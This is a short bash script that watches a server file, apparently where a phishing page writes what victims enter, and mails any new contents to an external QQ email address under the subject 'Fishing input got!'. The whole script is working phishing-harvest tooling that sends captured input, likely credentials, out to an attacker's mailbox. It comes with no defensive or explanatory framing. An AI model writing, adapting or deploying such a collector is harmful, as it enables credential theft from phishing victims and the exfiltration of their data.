# need jq,  yum install jq
function start(){
    # local file_path=/root/server
    # local file_name=1.txt
    local check_time=0.1
    while :
    do
        file_old_stat="`stat /root/server/1.txt`"
        #  echo old${file_old_stat}
        sleep ${check_time}
        file_new_stat="`stat /root/server/1.txt`"
        #  echo filenew${file_new_stat}
        if [[ `echo ${file_old_stat}` == `echo ${file_new_stat}` ]]; then
            # not change
            echo "not change" >> /dev/null
        else
            # changed
            export LANG=zh_CN.UTF-8
            date=`date`
            content=`cat /root/server/1.txt`
                       
            # echo content  ${content}
            echo "changed!!!!!!!!!!!!!!!!!!!!!!"
            echo -e " ${content}" >  /root/server/temp.txt
            dos2unix -k /root/server/temp.txt
            mail -s "Fishing input got! ${date}" 1419864987@qq.com < /root/server/temp.txt
            sleep 1
            echo "mail sent successfully!"
        fi
    done
}

start




